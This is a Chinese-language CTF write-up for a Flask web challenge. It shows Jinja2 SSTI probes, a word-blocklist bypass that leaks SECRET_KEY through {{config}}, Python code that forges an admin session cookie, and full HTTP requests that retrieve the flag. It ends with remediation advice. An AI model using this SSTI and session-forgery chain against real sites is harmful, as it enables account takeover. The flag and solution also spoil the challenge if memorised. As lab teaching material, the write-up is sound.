# 愿望墙 — WriteUp

| 项目 | 内容 |
|---|---|
| 分类 | Web / Jinja2 SSTI → `config` 泄露 → Flask 会话伪造 |
| 分值 | 1000 |
| 类型 | DynamicContainer |
| 入口 | `http://103.163.47.230:33700`（复现容器） |
| Flag | `HTUCTF{68ced9d8-736b-42bf-b835-a0aaab0b3c41}` |
| 复现脚本 | `solve_ssti.py`（一键，需 `pip install flask itsdangerous`） |

## 1. 站点结构

| 路由 | 作用 |
|---|---|
| `GET /` | 首页，显示当前身份（默认 `guest`） |
| `GET /login` + `POST /login` | 只填 `username` 就能登录（`admin` 是保留用户名，会被拒） |
| `GET /search?q=` | 检索愿望，**SSTI 注入点** |
| `GET /vault` | 愿望保险箱，两道锁：`admin` 身份 + 一句口令 |

保险箱页面原话：

> 保险箱有两道锁：**admin 的身份**，以及**一句正确的口令**。当前身份：游客

而 `POST /login` 提交 `admin` 会得到：

```
admin 是保留用户名，仅站内管理员可用
```

所以"成为 admin"这件事**不能走正常登录**——必须伪造会话。

## 2. 确认 SSTI（Burp Repeater）

在检索框里随便搜一个词 → Burp **Proxy → HTTP history** 找到 `GET /search?q=...`
→ 右键 **Send to Repeater**，把 `q` 的值换成探针：

```http
GET /search?q=%7B%7B7*7%7D%7D HTTP/1.1
Host: 103.163.47.230:33700
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

Response：

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

... 正在为你检索愿望：<b>49</b> ...
```

> `{{7*7}}` URL 编码后是 `%7B%7B7*7%7D%7D`。Burp Repeater 里也可以直接写明文 `{{7*7}}`，
> 但如果报 `400`，先用 **Decoder** 做 URL-encode 再粘。

`{{7*7}}` 被求值成了 `49`，说明用户输入被当作**模板源码**编译执行了
（`render_template_string("...你好，" + nickname + "...")` 这类字符串拼接写法）。
再补几个探针确认引擎是 Jinja2：

| 探针 | 回显 | 结论 |
|---|---|---|
| `{{7*7}}` | `49` | 表达式被服务端求值 |
| `{{7*"7"}}` | `7777777` | Python 语义（Jinja2） |
| `${7*7}` / `<%= 7*7 %>` | 原样输出 | 不是 EL / ERB |

## 3. 服务端有个"风控"词黑名单

题目说：

> 它很谨慎，谨慎到会**拦下所有它认为危险的词**。可真正危险的，往往不是它认得的那几个字。

实测黑名单（命中后页面回"风控拦截"）：

| payload | 结果 |
|---|---|
| `{{config}}` | ✅ 正常渲染（**没被拦**） |
| `{{self}}` / `{{lipsum}}` / `{{cycler}}` | ✅ 正常渲染 |
| `{{request}}` | ❌ 风控拦截 |
| `{{session}}` | ❌ 风控拦截 |

黑名单只挡住了走 `request` / `session` 的那几条常见 RCE 链（`request.application.__globals__` 之类），
**`config` 不在名单里**——而 Flask 的 `config` 里正好躺着 `SECRET_KEY`。

题目那句"真正危险的，往往不是它认得的那几个字"就是这个意思。

## 4. `{{config}}` 一把梭

```http
GET /search?q=%7B%7Bconfig%7D%7D HTTP/1.1
Host: 103.163.47.230:33700
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

... 正在为你检索愿望：<b>{'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': '4072dcee8f953057c87e843a9374afccb9edc874e3475d539743ae3d2bd6e85b', 'SECRET_KEY_FALLBACKS': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), ... 'VAULT_PIN': 'd165ee2c8381dfc5'}</b> ...
```

一把拿到两样东西：

- `SECRET_KEY` —— 签名会话用的密钥（**每个容器随机，必须现取**）
- `VAULT_PIN` —— 保险箱的第二道锁，那"一句正确的口令"

也可以只取单个键：`{{config["SECRET_KEY"]}}`。

> 顺带一提：Flask 的 session cookie 是**签名而非加密**的，
> payload 只是 base64+zlib 的 JSON。拿到 `SECRET_KEY` 就能随便签发任意身份。

## 5. 伪造 admin 会话

Flask 的 session 序列化器（`SecureCookieSessionInterface`）参数：

- salt = `"cookie-session"`
- `TaggedJSONSerializer` + `URLSafeTimedSerializer`
- signer kwargs：`key_derivation="hmac"`、`digest_method=hashlib.sha1`

不用手搓，直接借用 Flask 自己（保证版本兼容）：

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "4072dcee8f953057c87e843a9374afccb9edc874e3475d539743ae3d2bd6e85b"
ser = SecureCookieSessionInterface().get_signing_serializer(app)
cookie = ser.dumps({"username": "admin", "vault_pin": "d165ee2c8381dfc5"})
```

> ⚠️ 键名必须是 **`vault_pin`**（和 `config` 里的键呼应），写成 `pin` / `password` 都不认——
> 这一个字卡了不少时间。服务端校验大概就是
> `session.get("username") == "admin" and session.get("vault_pin") == VAULT_PIN`。

## 6. 开箱（Burp 里替换 Cookie）

### 6.1 先随便登录一次，拿到一个真实的 `session` cookie

```http
POST /login HTTP/1.1
Host: 103.163.47.230:33700
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Connection: close

username=guest&password=1
```

```http
HTTP/1.1 302 Found
Set-Cookie: session=eyJ1c2VybmFtZSI6Imd1ZXN0In0.aQAAAA.xxxxxxxx; Path=/
```

### 6.2 用拿到的 SECRET_KEY 伪造 admin 会话

这一步**必须本地算**（HMAC 签名），Burp 自己签不了。用 Flask 自己的序列化器最稳：

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "4072dcee8f953057c87e843a9374afccb9edc874e3475d539743ae3d2bd6e85b"  # 换成你取到的
ser = SecureCookieSessionInterface().get_signing_serializer(app)
print(ser.dumps({"username": "admin", "vault_pin": "d165ee2c8381dfc5"}))
```

把打印出来的那串作为 `session` 的值。

### 6.3 带伪造 Cookie 访问保险箱

```http
GET /vault HTTP/1.1
Host: 103.163.47.230:33700
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIiwidmF1bHRfcGluIjoiZDE2NWVlMmM4MzgxZGZjNSJ9.<timestamp>.<hmac>
Connection: close

```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

... HTUCTF{68ced9d8-736b-42bf-b835-a0aaab0b3c41} ...
```

> 在 Burp 里最省事的做法：Proxy 抓到任意带 `session` 的请求 → 右键
> **Send to Repeater** → 把 `Cookie: session=` 的值整段替换成上面算出来的串 → Send。

## 7. 一键复现（可选）

```bash
pip install flask itsdangerous
python solve_ssti.py http://IP:PORT
```

```
[1] {{7*7}} -> 49
[2] {{config}} -> SECRET_KEY = 4072dcee...   VAULT_PIN = d165ee2c8381dfc5
[3] cookie = session=eyJ1c2VybmFtZSI6ImFkbWluIiwi...
[4] /vault -> HTUCTF{68ced9d8-736b-42bf-b835-a0aaab0b3c41}
```

## 8. 知识点：从 SSTI 到会话伪造

**成因**：用户输入被**字符串拼接**进模板源码再交给 `render_template_string`。
`render_template`（模板文件 + 变量）是安全的，坏就坏在把用户输入当成**模板的一部分**编译。

**为什么 `config` 如此致命**：Flask 把应用配置对象注入到模板全局里。
任何一处 SSTI，只要能读到 `config['SECRET_KEY']`，就等于拿到了会话签发权——
不需要 RCE，直接"成为 admin"。

**Flask session 的安全性模型**：cookie 内容是 `{base64(json)}.{timestamp}.{hmac-sha1}`。
HMAC 保证**不可篡改**，但不保证**不可伪造**——密钥一旦泄露，攻击者可以签发任意 payload。
所以 `SECRET_KEY` 必须：

- 从环境变量注入，不要硬编码在源码里（本题是硬编码的随机串，但被 SSTI 读了出来）
- 每个部署环境独立随机
- 一旦疑似泄露立即轮换（轮换后所有会话失效）

## 9. 修复建议

```python
# ❌ 拼接用户输入进模板源码
render_template_string("正在为你检索愿望：" + q + "。")

# ✅ 把用户输入当作数据传进固定模板
render_template_string("正在为你检索愿望：{{ q }}。", q=q)
```

- 永远不要把用户输入拼进模板源码；`render_template_string` 只接受常量模板
- 不要把 `SECRET_KEY` 等敏感配置留在 `config` 里让模板可见（或改用 `SandboxedEnvironment`
  限制模板可访问的对象）
- `SECRET_KEY` 走环境变量，长度 ≥ 32 字节真随机
- 关键操作（开保险箱）不要只靠 session 里的一个布尔/字符串，服务端应二次校验
